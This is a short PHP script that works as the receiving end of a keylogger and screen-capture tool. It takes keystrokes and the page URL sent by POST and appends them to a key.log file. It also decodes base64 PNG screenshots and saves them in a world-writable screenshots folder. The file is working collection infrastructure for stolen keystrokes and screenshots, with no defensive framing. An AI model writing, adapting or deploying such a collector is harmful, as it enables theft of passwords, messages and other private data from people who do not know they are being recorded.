<?php
session_start();

if (!isset($_POST['key']) && !isset($_POST['screenshot'])) {
	echo("Access Denied!");
	exit(0);
}
if (isset($_POST['key'])){
    $file = fopen("key.log", "a+");
	// If the page is not updated, the url does not need to be written.
    if(!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']){
        $_SESSION['page'] = $_POST['page'];
        fwrite($file, " ".$_POST['page']." ");
    }
    fwrite($file,$_POST['key']);
    fclose($file);
    echo('Char saved!');
}

if (isset($_POST['screenshot'])){
    
    // Screenshot data is sent as a base64 encoded PNG
    $data = $_POST['screenshot'];
    // Remove the "data:image/png;base64," part
    $uri =  substr($data, strpos($data, ",") + 1);

    // Create a directory for screenshots if it doesn't exist
    $dir = 'screenshots';
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    
    // Save to a file inside the directory
    $file = $dir . '/screenshot_' . date('Y-m-d_H-i-s') . '.png';
    file_put_contents($file, base64_decode($uri));
    echo('Screenshot saved!');
}
?>
